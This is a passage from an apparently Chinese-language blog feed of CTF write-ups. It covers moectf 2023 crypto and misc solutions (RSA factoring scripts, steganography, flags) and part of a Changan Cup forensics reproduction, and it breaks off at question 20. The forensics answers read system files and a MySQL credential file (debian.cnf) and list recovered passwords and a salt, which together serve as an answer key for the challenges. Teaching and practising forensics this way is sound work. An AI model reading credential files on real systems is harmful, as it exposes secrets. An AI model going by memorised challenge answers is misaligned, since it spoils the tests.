<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q = &quot;</span>, q)<br>                d = gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d = &quot;</span>, d)<br>                m = <span class="hljs-built_in">pow</span>(c[i], d, n[i])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;m = &quot;</span>, m)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">moectf&#123;<span class="hljs-symbol">it_is_re@</span><span class="hljs-symbol">lly_@</span><span class="hljs-symbol">_signin_level_cryPto_ch@</span><span class="hljs-symbol">ll@</span>nge_ng92WPIBung92WPIBun&#125;<br></code></pre></td></tr></table></figure><h3 id="factorize-me"><a href="#factorize-me" class="headerlink" title="factorize_me!"></a><strong>factorize_me!</strong></h3><p>​    无法直接分解n，观察代码，发现n是由prime2累乘得到，而prime2可以由prime得到，而prime累乘数已经告知，尝试分解，得到al数组，编写脚本</p><p>脚本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros">al=[6811480804433459752827714558479851837166061762294131563310130325846430072816177165149613687307165209577130630311477665591141650399740741396784593477667511,<br>6991223361118904775931217829045348785013077549030883418924453538830605687999480005714979700653172534877541317997174968789510984315425270755055110913347281,<br>7592439908930473591169395506464664967460880934907692099467559610659035874008829133810341129161864445676397227262130671224157308868678442281617413952593477,<br>7661276973316857207751367277881032536449069939447322837508906694964933673171693624171780997296797446643574508184011878230465391879808258241752897792891323,<br>8752762682421281693932454897190422008900505775990831144558827755415243453970083322530846132571648469860763497724505255094464743633789884168771246977571539,<br>9987009117206906203158749743824168660291275882852229158070368815160479543708376165641735042845357978292384303332559592302507789120810447986634662721490507,<br>10022455487144667211701100343824680124338467215246658405697280466931561838565228778624923751405642974058833143888323468902504576610147119708725877528011439,<br>11627877395179828773706504422918933052041685770731872812302758181943244472706231518350716590168708806854971155512042158777017234038219076771501368374236727,<br>12876877424944854147075816504195994138450356002779004886384584287813869165469217718717854027672044903401715370348223932937626725119320180795716270261309139]<br><span class="hljs-attribute">n</span>=899081756851564072995842371038848265712822308942406479625157544735473115850983700580364485532298999127834142923262920189902691972009898741820291331257478170998867183390650298055916005944577877856728843264502218692432679062445730259562784479410120575777748292393321588239071577384218317338474855507210816917917699500763270490789679076190405915250953860114858086078092945282693720016414837231157788381144668395364877545151382171251673050910143023561541226464220441<br>e = 65537<br>c = 841335863342518623856757469220437045493934999201203757845757404101093751603513457430254875658199946020695655428637035628085973393246970440054477600379027466651143466332405520374224855994531411584946074861018245519106776529260649700756908093025092104292223745612991818151040610497258923925952531383407297026038305824754456660932812929344928080812670596607694776017112795053283695891798940700646874515366341575417161087304105309794441077774052357656529143940010140<br><br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><br><span class="hljs-keyword">from</span> Crypto.Util.number import getPrime<br><span class="hljs-keyword">from</span> math import prod<br><span class="hljs-keyword">from</span> sympy import nextprime<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(9):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(9):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> range(9):<br>            <span class="hljs-attribute">q</span>=nextprime(al[i])<br>            <span class="hljs-attribute">w</span>=nextprime(al[j])<br>            <span class="hljs-attribute">r</span>=nextprime(al[k])<br>            <span class="hljs-attribute">z</span>=q*w*r<br>            <span class="hljs-keyword">if</span>(<span class="hljs-attribute">n</span>==z):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q=&quot;</span>,q)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r=&quot;</span>,r)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;w=&quot;</span>,w)<br>                phi=(q-1)*(w-1)*(r-1)<br>                <span class="hljs-attribute">d</span>=invert(e,phi)<br>                <span class="hljs-attribute">m</span>=powmod(c,d,n)<br>                <span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>​       </p><p>flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;you_KNow_how_to_faCtorize_N_right?_9?WPIBung6?WPIBung6?WPIBund6?&#125;<br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h1><h3 id="Misc-入门指北"><a href="#Misc-入门指北" class="headerlink" title="Misc 入门指北"></a><strong>Misc</strong> <strong>入门指北</strong></h3><p>​    Base64解密</p><p>flag：moectf{h@v3_fun_@t_m15c_!}</p><h3 id="打不开的图片1"><a href="#打不开的图片1" class="headerlink" title="打不开的图片1"></a><strong>打不开的图片1</strong></h3><p>用010editor打开，发现是jpg格式文件，修复文件头，可以打开，有exif信息，16进制转换得flag</p><p>Flag：moectf{XDU_i5_v3ry_6e@u2ifu1}</p><h3 id="打不开的图片2"><a href="#打不开的图片2" class="headerlink" title="打不开的图片2"></a><strong>打不开的图片2</strong></h3><p>​    用010editor打开，发现ihdr，查看文件尾，为png文件尾，修复文件头，成功打开图片得到flag</p><img src="/2024/04/29/moectf2023/clip_image024.jpg" class title="img"><h3 id="狗子-1-普通的猫"><a href="#狗子-1-普通的猫" class="headerlink" title="狗子(1) 普通的猫"></a><strong>狗子(1) 普通的猫</strong></h3><p>​    用010editor打开,文件尾部找到flag</p><p>Flag: </p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;eeeez_f1ag_as_<span class="hljs-built_in">A_G1ft</span>!&#125;<br></code></pre></td></tr></table></figure><h3 id="building-near-lake"><a href="#building-near-lake" class="headerlink" title="building_near_lake"></a><strong>building_near_lake</strong></h3><p>​    下载图片可以查询到拍摄信息，照相机制造商为Xiaomi，型号为22122RK93C，搜素发现是红米k60，搜索发布会时间，得到20221227，百度识图发现拍摄地点是厦门大学翔安德望图书馆，地图查询经纬度，得到flag</p><img src="/2024/04/29/moectf2023/clip_image026.png" class title="img"><h3 id="烫烫烫"><a href="#烫烫烫" class="headerlink" title="烫烫烫"></a><strong>烫烫烫</strong></h3><p>​    转储utf-7，正常显示，</p><img src="/2024/04/29/moectf2023/clip_image028.png" class title="img"><p>计算key——b34edc782d68fda34dc2332967273b0f0900a0ebd0dcec48467851bc6117bad1，进行aes计算，得flag</p><p>Flag：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">moectf&#123;<span class="hljs-symbol">codep@</span><span class="hljs-symbol">ge_pl@</span><span class="hljs-symbol">ys_@</span><span class="hljs-symbol">n_iMport@</span><span class="hljs-symbol">nt_role_in_intern@</span><span class="hljs-symbol">tion@</span><span class="hljs-symbol">liz@</span>tion_g92WPIB&#125;<br></code></pre></td></tr></table></figure><h3 id="狗子-2-照片"><a href="#狗子-2-照片" class="headerlink" title="狗子(2) 照片"></a><strong>狗子(2) 照片</strong></h3><p>​    用zsteg跑lsb，得flag</p><p>Flag：moectf{D0ggy_H1dd3n_1n_Pho7o_With_LSB!}</p><h3 id="base乐队"><a href="#base乐队" class="headerlink" title="base乐队"></a><strong>base乐队</strong></h3><p>​    依次用base32、base58、base32解密得到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">bYeNQXYZXbXZQfW31FGzzD0m0FHQ9RR85FFQYMB9M</span><span class="hljs-operator">=</span>lmo2ku11z0uiz<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>发现中间有=，目前已知出现=均是在字符串尾部，猜测通过某种加密将=放在了中间，尝试暴力栅栏，得到flag</p><p>flag：moectf{Th4_6@nd_1nc1ud45_F3nc4_@nd_b@s3}</p><h3 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a><strong>奇怪的压缩包</strong></h3><p>​    压缩包打开，发现有个文件夹为ppt，根据题目描述，改后缀，成功得到ppt文件，通过改字体颜色、遮挡、批注、解压ppt文档隐藏</p><p>Flag：moectf{2ip123456_?_ n0_i4_pp4x!}</p><h3 id="机位查询"><a href="#机位查询" class="headerlink" title="机位查询"></a><strong>机位查询</strong></h3><p>   三张图片的地点均在广西南宁，分别是南宁站、中山路美食街、华润大厦，查卫星地图可分析得到前两张图片拍摄地点为嘉士摩根国际、百盛步行街广场，最后一张始终分析不出拍摄的地点，仔细查看，发现有exif信息，有gps定位，查询，找到汇金宛，</p><img src="/2024/04/29/moectf2023/clip_image030.png" class title="img"><p>Flag：moectf{jiashi_baisheng_huijin}</p><h3 id="狗子-3-寝室"><a href="#狗子-3-寝室" class="headerlink" title="狗子(3) 寝室"></a><strong>狗子(3) 寝室</strong></h3><p>​     编写压缩包解压脚本或工具解压，得到flag.txt</p><p>Flag: moectf{Ca7_s133p1ng_und3r_zip_5hell5}</p><h3 id="尊嘟假嘟？"><a href="#尊嘟假嘟？" class="headerlink" title="尊嘟假嘟？"></a><strong>尊嘟假嘟？</strong></h3><p>​     根据hint1涉及到base58，尝试base58解密</p><img src="/2024/04/29/moectf2023/clip_image032.png" class title="img"><p>一堆乱码，而hint2提示为bl<strong>*</strong>sh加密，想到blowfish，将key和iv求出，带入解密，得到一个可疑字符串</p><img src="/2024/04/29/moectf2023/clip_image034.png" class title="img"><p>再进行base64解密，得到flag</p><img src="/2024/04/29/moectf2023/clip_image036.png" class title="img">]]></content>
    
    
    <categories>
      
      <category>CTF WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第四届长安杯取证复现</title>
    <link href="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/"/>
    <url>/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/</url>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1JWxtyhzmjZksAos2QUaWcw?pwd=wvk4">下载</a>好附件，VeraCrypt密码：2022.4th.changancup!</p><p><a href="https://www.forensics-wiki.com/base/veracrypt/">使用VeraCrypt挂在VC容器</a></p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408142228909.png" class title="image-20240408142228909"><p>我选择是在Z盘，加载成功后多出一个Z盘，打开得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408142312925.png" class title="image-20240408142312925"><h2 id="1-检材1的SHA256值为？"><a href="#1-检材1的SHA256值为？" class="headerlink" title="1.检材1的SHA256值为？"></a>1.检材1的SHA256值为？</h2><p>用X-ways计算sha265,直接拖入—&gt;工具—&gt;计算哈希，选择sha256即可，注意这里的sha256问的是原始硬盘的哈希值，而非.e01文件的哈希值</p><p>错误答案</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408170254927.png" class title="image-20240408170254927"><p>正确答案</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408170425738.png" class title="image-20240408170425738"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">9E48BB2CAE5C1D93BAF572E3646D2ECD26080B70413DC7DC4131F88289F49E34<br></code></pre></td></tr></table></figure><h2 id="2-分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2"><a href="#2-分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2" class="headerlink" title="2.分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2"></a>2.分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2</h2><p>仿真后选择第二个选项进入，root账户为弱密码123456，执行last命令，得到ip（这里如果仿真失败，<a href="https://www.cnblogs.com/dfir/p/16353508.html#6%E7%A3%81%E7%9B%98%E8%A2%AB%E5%8D%A0%E7%94%A8%E9%97%AE%E9%A2%98">参考</a>），如果还是不行，就更换<a href="https://www.52pojie.cn/thread-1698481-1-1.html">FTK</a>版本。这里我测试3.3的比较好用</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408234736568.png" class title="image-20240408234736568"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">172.16.80.100<br></code></pre></td></tr></table></figure><h2 id="3-检材1中，操作系统发行版本号为"><a href="#3-检材1中，操作系统发行版本号为" class="headerlink" title="3.检材1中，操作系统发行版本号为"></a>3.检材1中，操作系统发行版本号为</h2><p>执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/*-release<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408235019922.png" class title="image-20240408235019922"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">CentOS 7.5.1804<br></code></pre></td></tr></table></figure><h2 id="4-检材1系统中，网卡绑定的静态IP地址为"><a href="#4-检材1系统中，网卡绑定的静态IP地址为" class="headerlink" title="4.检材1系统中，网卡绑定的静态IP地址为"></a>4.检材1系统中，网卡绑定的静态IP地址为</h2><p>执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ifconfig<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408235220717.png" class title="image-20240408235220717"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">172.16.80.133<br></code></pre></td></tr></table></figure><h2 id="5-检材1中，网站jar包所存放的目录是-答案为绝对路径，如“-home-honglian-”"><a href="#5-检材1中，网站jar包所存放的目录是-答案为绝对路径，如“-home-honglian-”" class="headerlink" title="5.检材1中，网站jar包所存放的目录是(答案为绝对路径，如“/home/honglian/”)"></a>5.检材1中，网站jar包所存放的目录是(答案为绝对路径，如“/home/honglian/”)</h2><p>这里可以执行history命令查看历史命令，在/web/app目录下有多次操作，可以在该目录下发现大量jar包，或者执行find命令查找</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -name *.jar<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408235338821.png" class title="image-20240408235338821"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">/web/app/<br></code></pre></td></tr></table></figure><h2 id="6-检材1中，监听7000端口的进程对应文件名为"><a href="#6-检材1中，监听7000端口的进程对应文件名为" class="headerlink" title="6.检材1中，监听7000端口的进程对应文件名为"></a>6.检材1中，监听7000端口的进程对应文件名为</h2><p>解压缩，在cloud.jar的BOOT-INF\classes\application.properties发现7000端口</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409110206022.png" class title="image-20240409110206022"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">application.properties<br></code></pre></td></tr></table></figure><h2 id="7-检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）"><a href="#7-检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）" class="headerlink" title="7.检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）"></a>7.检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409113321599.png" class title="image-20240409113321599"><p>可以看到在/web/app/admin下多次执行npm run dev命令，故在该目录下复现操作</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409113449452.png" class title="image-20240409113449452"><p>登录0.0.0.0:9090，发现是网站后台</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240410202347637.png" class title="image-20240410202347637"><p>故网址端口为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">9090<br></code></pre></td></tr></table></figure><h2 id="8-检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“https-www-forensix-cn-abc-def”"><a href="#8-检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“https-www-forensix-cn-abc-def”" class="headerlink" title="8.检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“https://www.forensix.cn/abc/def”)"></a>8.检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“<a href="https://www.forensix.cn/abc/def”">https://www.forensix.cn/abc/def”</a>)</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409124341670.png" class title="image-20240409124341670"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240410203832688.png" class title="image-20240410203832688"><p>查看日志，发现可疑端口3000，猜测是网址前台，根据历史命令，尝试搭建</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409124806458.png" class title="image-20240409124806458"><p>扫码复制链接得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://pan.forensix.cn/f/c45ca511c7f2469090ad/?dl=1<br></code></pre></td></tr></table></figure><h2 id="9-检材1中，网站管理后台页面调用的用户表-admin-里的密码字段加密方式为"><a href="#9-检材1中，网站管理后台页面调用的用户表-admin-里的密码字段加密方式为" class="headerlink" title="9.检材1中，网站管理后台页面调用的用户表(admin)里的密码字段加密方式为?"></a>9.检材1中，网站管理后台页面调用的用户表(admin)里的密码字段加密方式为?</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409125332761.png" class title="image-20240409125332761"><p>尝试登录发现url为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://172.16.80.133:6010/admin/system/employee/googleAuth/sign/in<br></code></pre></td></tr></table></figure><p>在admin-api.jar里查找</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409130211737.png" class title="image-20240409130211737"><p>加密方法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">md5<br></code></pre></td></tr></table></figure><h2 id="10-分析检材1，网站管理后台登录密码加密算法中所使用的盐值是"><a href="#10-分析检材1，网站管理后台登录密码加密算法中所使用的盐值是" class="headerlink" title="10. 分析检材1，网站管理后台登录密码加密算法中所使用的盐值是"></a><strong>10.</strong> 分析检材1，网站管理后台登录密码加密算法中所使用的盐值是</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240410202041387.png" class title="image-20240410202041387"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">XehGyeyrVgOV4P8Uf70REVpIw3iVNwNs<br></code></pre></td></tr></table></figure><h2 id="11-检材2中，windows账户Web-King的登录密码是"><a href="#11-检材2中，windows账户Web-King的登录密码是" class="headerlink" title="11.检材2中，windows账户Web King的登录密码是"></a>11.检材2中，windows账户Web King的登录密码是</h2><p>火眼得到密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">135790<br></code></pre></td></tr></table></figure><h2 id="12-检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3"><a href="#12-检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3" class="headerlink" title="12.检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3"></a>12.检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3</h2><p>仿真后xshell要更新，无法使用，打开其安装目录，在Users/Web King/Documents/NetSarang Computer/7/Xshell/Sessions得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412115713352.png" class title="image-20240412115713352"><p>答案为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">172.16.80.128<br></code></pre></td></tr></table></figure><h2 id="13-检材2中，powershell中输入的最后一条命令是"><a href="#13-检材2中，powershell中输入的最后一条命令是" class="headerlink" title="13.检材2中，powershell中输入的最后一条命令是"></a>13.检材2中，powershell中输入的最后一条命令是</h2><p>打开powershell，按↑得到，或者使用命令Get-History | Format-List -Property *</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412120041769.png" class title="image-20240412120041769"><p>答案：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ipconfig<br></code></pre></td></tr></table></figure><h2 id="14-检材2中，下载的涉案网站源代码文件名为"><a href="#14-检材2中，下载的涉案网站源代码文件名为" class="headerlink" title="14.检材2中，下载的涉案网站源代码文件名为"></a>14.检材2中，下载的涉案网站源代码文件名为</h2><p>在检材1的网站里，可以发现网站名字，打开下载目录</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121034133.png" class title="image-20240412121034133"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121156972.png" class title="image-20240412121156972"><p>所以答案为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">ZTuoExchange_framework-master.zip<br></code></pre></td></tr></table></figure><h2 id="15-检材2中，网站管理后台root账号的密码为"><a href="#15-检材2中，网站管理后台root账号的密码为" class="headerlink" title="15.检材2中，网站管理后台root账号的密码为"></a>15.检材2中，网站管理后台root账号的密码为</h2><p>打开浏览器查看浏览器储存的密码</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121402793.png" class title="image-20240412121402793"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">root<br></code></pre></td></tr></table></figure><h2 id="16-检材2中，技术员使用的WSL子系统发行版本是（答案格式如下：windows-10-1）"><a href="#16-检材2中，技术员使用的WSL子系统发行版本是（答案格式如下：windows-10-1）" class="headerlink" title="16.检材2中，技术员使用的WSL子系统发行版本是（答案格式如下：windows 10.1）"></a>16.检材2中，技术员使用的WSL子系统发行版本是（答案格式如下：windows 10.1）</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121540956.png" class title="image-20240412121540956"><p>在搜索栏搜索常见的wsl，这里有2个，运行只有20的可以，或者执行命令wsl —list –verbose</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121717638.png" class title="image-20240412121717638"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">ubuntu 20.04<br></code></pre></td></tr></table></figure><h2 id="17-检材2中，运行的数据库服务版本号是（答案格式如下：10-1）"><a href="#17-检材2中，运行的数据库服务版本号是（答案格式如下：10-1）" class="headerlink" title="17.检材2中，运行的数据库服务版本号是（答案格式如下：10.1）"></a>17.检材2中，运行的数据库服务版本号是（答案格式如下：10.1）</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121835144.png" class title="image-20240412121835144"><p>进入WSL,执行mysql -V</p><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">mysql 8.0.30<br></code></pre></td></tr></table></figure><h2 id="18-上述数据库debian-sys-maint用户的初始密码是"><a href="#18-上述数据库debian-sys-maint用户的初始密码是" class="headerlink" title="18.上述数据库debian-sys-maint用户的初始密码是"></a>18.上述数据库debian-sys-maint用户的初始密码是</h2><p>执行 cat /etc/mysql/debian.cnf得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412123700724.png" class title="image-20240412123700724"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">ZdQfi7vaXjHZs75M<br></code></pre></td></tr></table></figure><h2 id="19-检材3服务器root账号的密码是"><a href="#19-检材3服务器root账号的密码是" class="headerlink" title="19.检材3服务器root账号的密码是"></a>19.检材3服务器root账号的密码是</h2><p>执行history命令，发现用root账户连接了172.16.80.128</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412124154091.png" class title="image-20240412124154091"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">h123456<br></code></pre></td></tr></table></figure><h2 id="20-检材3中，监听33050端口的程序名（program-name）为"><a href="#20-检材3中，监听33050端口的程序名（program-name）为" class="headerlink" title="20.检材3中，监听33050端口的程序名（program name）为"></a>20.检材3中，监听33050端口的程序名（program name）为</h2><p>仿真后xshel连接，使用history命令，发现在data/mysql下启动了docker</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412193052083.png" class title="image-20240412193052083"><img 